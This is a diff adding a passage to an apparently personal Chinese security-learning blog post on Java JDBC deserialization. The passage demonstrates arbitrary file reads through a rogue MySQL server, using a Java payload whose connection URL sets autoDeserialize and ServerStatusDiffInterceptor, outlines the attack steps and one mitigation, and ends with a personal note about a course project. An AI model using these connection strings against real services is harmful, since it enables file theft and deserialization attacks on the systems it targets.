@@ -1,5 +1,5 @@
 ---
-layout: post
+·layout: post
 title: javaJDBC反序列化
 categories: [blog ]
 tags: [Java,]
@@ -481,5 +481,71 @@ while (true) {
   echo "\n\n";
   fclose($s);
 }
+```
+
+## 此时遇到了一个很棘手的问题（未解决）
+
+就是在服务器上部署恶意服务器的时候；java一连接就报错，很不理解，远程打JDBC未成功
+
+但是在kali和本地都是正常的
+
+![image-20231128151116391](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128151116391.png)
+
+## mysql任意读取文件实践
+
+![image-20231128152429751](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128152429751.png)
+
+```java
+    import com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor;
+    import com.mysql.cj.jdbc.result.ResultSetImpl;
+
+    import java.sql.Connection;
+
+    import java.sql.DriverManager;
+
+    public class payload {
+        public static void main(String[] args) throws Exception {
+            String driver = "com.mysql.cj.jdbc.Driver";
+            String DB_URL = "jdbc:mysql://:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
+                DB_URL="jdbc:mysql://:3307?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=fileread_c:\\windows\\win.ini";
+            String username = "root";
+            String password = "200377";
+
+            Class.forName(driver);
+           // Connection conn = DriverManager.getConnection(DB_URL, username, password);
+            Connection conn = DriverManager.getConnection(DB_URL);
+
+        }
+    }
+
+```
+
+继续读某一个jar包呢（也是可以的）
+
+![image-20231128152909719](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128152909719.png)
+
+##### 总结一下流程：
+
+```java
+1、首先尝试mysql连接恶意的服务器，我们通过服务器可以篡改任意读取的信息
+2、如果那条连接到sql语句可控，我们更加方便任意读取文件
+3、构造恶意服务器，打反序列化JDBC
+关键就是通过wireshark抓包，构造虚假的流量通信
+前提：mysql语句是可控的不然连接不到自己的恶意服务器（baiwan
+如果想规避这种情况，可以使用--ssl-mode=VERIFY_IDENTITY来建立可信的连接。
+```
+
+润了继续奔赴下一个战场了（DASCTF）
+
+### 写一下最近的情况叭：
+
+```java
+最近开始了软件工程&java开发的课程实践，91个人，6个人一组 余出来一个
+😔，因为老师说写出需求画图即可，并不需要代码的实现，于是舔face加入了女生的一组（我是第七个人当时感觉自己就是天选之子）
+没办法，很多组都是7个人，需要重新划分，tnnd，我以为我稳了，结果被留到了最后东拼西凑的组，天选之人并不是我
+ 我tnnd🥵🥵🥵，这个组真的是依托答辩，一个人都不熟还没能带我C的人
+开摆，反正不用代码实现。。。
+做什么？难得啥交通，我会写遍历？我会深度优先算法？写g8
+写个图书馆我觉得就不戳，没准能实现，最后在尝试尝试漏洞这不美滋滋？？？
 ```
 
